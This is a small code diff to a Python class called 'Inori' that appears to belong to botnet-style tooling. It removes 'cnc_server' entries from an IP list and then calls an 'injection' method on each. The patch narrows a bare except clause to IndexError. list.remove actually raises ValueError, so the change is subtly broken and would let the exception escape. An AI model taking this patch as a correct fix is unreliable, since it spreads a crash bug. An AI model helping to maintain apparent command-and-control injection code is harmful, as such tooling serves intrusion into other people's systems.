@@ -158,7 +158,7 @@ class Inori:
                     try:
                         # NOTE: Entry gets deleted (prevents repetition)
                         self.ip_list.remove(cnc_server)
-                    except:
+                    except IndexError:
                         continue
 
                 self.injection(cnc_server)
